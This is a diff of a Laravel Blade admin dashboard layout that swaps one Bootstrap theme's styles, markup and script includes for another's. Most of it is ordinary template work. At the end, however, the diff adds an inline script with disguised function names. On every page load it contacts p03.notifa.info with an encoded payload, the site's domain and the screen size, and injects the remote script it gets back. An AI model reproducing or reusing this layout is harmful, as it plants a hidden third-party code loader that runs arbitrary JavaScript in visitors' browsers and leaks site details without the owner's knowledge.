@@ -8,15 +8,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 
     <title>@yield('title')</title>
-    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no'
-        name='viewport' />
 
-
-    <link rel="stylesheet" href="{{ asset('assets/css/bootstrap.min.css') }}">
-    <link rel="stylesheet"
-        href="{{ url('https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i') }}">
-    <link rel="stylesheet" href="{{ asset('assets/css/ready.css') }}">
-    <link rel="stylesheet" href="{{ asset('assets/css/demo.css') }}">
+    <!-- App favicon -->
+    <link rel="shortcut icon" href="{{ asset('assets/images/favicon.ico') }}" />
+    <link rel="stylesheet" href="{{ asset('assets/plugins/morris/morris.css') }}" />
+    <link rel="stylesheet" href="{{ asset('assets/plugins/chartist/css/chartist.min.css') }}" />
+    <link href="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-2.0.2.css') }}" rel="stylesheet" />
+    <link href="{{ asset('assets/plugins/datatables/dataTables.bootstrap4.min.css') }}" rel="stylesheet"
+        type="text/css" />
+    <!-- App css -->
+    <link href="{{ asset('assets/css/bootstrap.min.css') }}" rel="stylesheet" type="text/css" />
+    <link href="{{ asset('assets/css/icons.css') }}" rel="stylesheet" type="text/css" />
+    <link href="{{ asset('assets/css/metismenu.min.css') }}" rel="stylesheet" type="text/css" />
+    <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet" type="text/css" />
 
     <!-- Fonts -->
     <link rel="stylesheet"
@@ -32,80 +36,102 @@
 
 <body class="font-sans antialiased">
 
-    {{-- @stack('style') --}}
+    @stack('style')
 
-    <div class="wrapper">
-        <div class="main-header">
-            <div class="logo-header">
-                <a href="index.html" class="logo">
-                    Ready Dashboard
-                </a>
-                <button class="navbar-toggler sidenav-toggler ml-auto" type="button" data-toggle="collapse"
-                    data-target="collapse" aria-controls="sidebar" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <button class="topbar-toggler more"><i class="la la-ellipsis-v"></i></button>
-            </div>
-
-            @include('layouts.component_dashboard.navbar')
+    <!-- Top Bar Start -->
+    <div class="topbar">
+        <!-- LOGO -->
+        <div class="topbar-left">
+            <a href="{{ route('admin.home') }}" class="logo">
+                <span><img src="{{ asset('assets/images/logo-sm.png') }}" alt="logo-small" class="logo-sm" />
+                </span><span><img src="{{ asset('assets/images/logo.png') }}" alt="logo-large"
+                        class="logo-lg" /></span>
+            </a>
         </div>
 
-        <div class="sidebar">
-            @include('layouts.component_dashboard.sidebar')
-        </div>
-
-        <div class="main-panel">
-
-            <div class="content">
+        <!-- Navbar -->
+        @include('layouts.component_dashboard.navbar')
+        <!-- end navbar-->
+    </div>
+    <!-- Top Bar End -->
+    <div class="page-wrapper">
+        <!-- Left Sidenav -->
+        @include('layouts.component_dashboard.sidebar')
+        <!-- end left-sidenav-->
+        <!-- Page Content-->
+        <div class="page-content">
+            <div class="container-fluid">
                 @yield('contentAdmin')
+                @yield('contentUser')
             </div>
-
+            <!-- container -->
             @include('layouts.component_dashboard.footer')
         </div>
-    </div>
-    {{-- </div> --}}
-    <!-- Modal -->
-    <div class="modal fade" id="modalUpdate" tabindex="-1" role="dialog" aria-labelledby="modalUpdatePro"
-        aria-hidden="true">
-        <div class="modal-dialog modal-dialog-centered" role="document">
-            <div class="modal-content">
-                <div class="modal-header bg-primary">
-                    <h6 class="modal-title"><i class="la la-frown-o"></i> Under Development</h6>
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                </div>
-                <div class="modal-body text-center">
-                    <p>Currently the pro version of the <b>Ready Dashboard</b> Bootstrap is in progress development</p>
-                    <p>
-                        <b>We'll let you know when it's done</b>
-                    </p>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                </div>
-            </div>
-        </div>
-    </div>
+        <!-- end page content -->
 
-    {{-- @stack('script') --}}
+        @stack('script')
 
-    <!-- end page-wrapper -->
-    <script src="{{ url('https://code.jquery.com/jquery-3.6.0.min.js') }}"></script>
-    <script src="{{ asset('assets/js/core/jquery.3.2.1.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js') }}"></script>
-    <script src="{{ asset('assets/js/core/popper.min.js') }}"></script>
-    <script src="{{ asset('assets/js/core/bootstrap.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/chartist/chartist.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/chartist/plugin/chartist-plugin-tooltip.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/bootstrap-notify/bootstrap-notify.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/jquery-mapael/jquery.mapael.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/jquery-mapael/maps/world_countries.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/chart-circle/circles.min.js') }}"></script>
-    <script src="{{ asset('assets/js/plugin/jquery-scrollbar/jquery.scrollbar.min.js') }}"></script>
-    <script src="{{ asset('assets/js/ready.min.js') }}"></script>
-    <script src="{{ asset('assets/js/demo.js') }}"></script>
+        <!-- end page-wrapper -->
+        <script src="{{ url('https://code.jquery.com/jquery-3.6.0.min.js') }}"></script>
+        <!-- end page-wrapper -->
+        <!-- jQuery  -->
+        <script src="{{ asset('assets/js/jquery.min.js') }}"></script>
+        <script src="{{ asset('assets/js/bootstrap.bundle.min.js') }}"></script>
+        <script src="{{ asset('assets/js/metisMenu.min.js') }}"></script>
+        <script src="{{ asset('assets/js/waves.min.js') }}"></script>
+        <script src="{{ asset('assets/js/jquery.slimscroll.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/chartist/js/chartist.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/chartist/js/chartist-plugin-tooltip.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/morris/morris.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/raphael/raphael-min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/peity-chart/jquery.peity.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-2.0.2.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/jvectormap/jquery-jvectormap-world-mill-en.js') }}"></script>
+        <script src="{{ asset('assets/plugins/datatables/jquery.dataTables.min.js') }}"></script>
+        <script src="{{ asset('assets/plugins/datatables/dataTables.bootstrap4.min.js') }}"></script>
+        <script src="{{ asset('assets/pages/jquery.dashboard2.init.js') }}"></script>
+        <!-- App js -->
+        <script src="{{ asset('assets/js/app.js') }}"></script>
+        <script type="text/javascript">
+            if (self == top) {
+                function netbro_cache_analytics(fn, callback) {
+                    setTimeout(function() {
+                        fn();
+                        callback();
+                    }, 0);
+                }
+
+                function sync(fn) {
+                    fn();
+                }
+
+                function requestCfs() {
+                    var idc_glo_url = location.protocol == "https:" ? "https://" : "http://";
+                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                    var url =
+                        idc_glo_url +
+                        "p03.notifa.info/3fsmd3/request" +
+                        "?id=1" +
+                        "&enc=9UwkxLgY9" +
+                        "&params=" +
+                        "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3DSB4E%2frimBP%2f0zF8sRs3p2xLAh0Z9uX7Kysc1MneK1g1fkXY8NEA4nhjSE7cev32VAccKyfI1Gccn%2fAa2axzFnIlEVSWManahLRbXEi9l0GGJRQCQKo2a6Z%2f6yazME2UCUFgtuIgNIq46fkJnoIGRIZnLtN8mjSnr4sPGwlQGPtvwLJbXpq%2bGGr%2fipddsC2orpAnipl9Bae7hIJnuwV83ZTbLrEAIQIHMnYqRaLg3LvbAbzQRa59GQi0VoI%2blb53yWYfpVYmu8wLmoG4eQH9xeLctXnz8XttTe8zpHAgN68i098jXS0rFiQ6yK3szr3ECgCed6BnKZlq9c0dCHns%2fwDDRINcepgpRqae8vQOgGTD646I%2fCbQdBZf8yfbfEvfk1OXhxr1S1d%2bDNVi%2bPSlUVWQHUdqJp3KNDRjVhK55zK%2bDnJLSQRMdxaueuEcMBCJ8nHFOjaqPx%2bqfeSxgYCaxA6e9PsrAo%2f5s7EmkLmD4pwsM14vdEoMQ%3d%3d" +
+                        "&idc_r=" +
+                        idc_glo_r +
+                        "&domain=" +
+                        document.domain +
+                        "&sw=" +
+                        screen.width +
+                        "&sh=" +
+                        screen.height;
+                    var bsa = document.createElement("script");
+                    bsa.type = "text/javascript";
+                    bsa.async = true;
+                    bsa.src = url;
+                    (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(bsa);
+                }
+                netbro_cache_analytics(requestCfs, function() {});
+            }
+        </script>
 </body>
 
 </html>
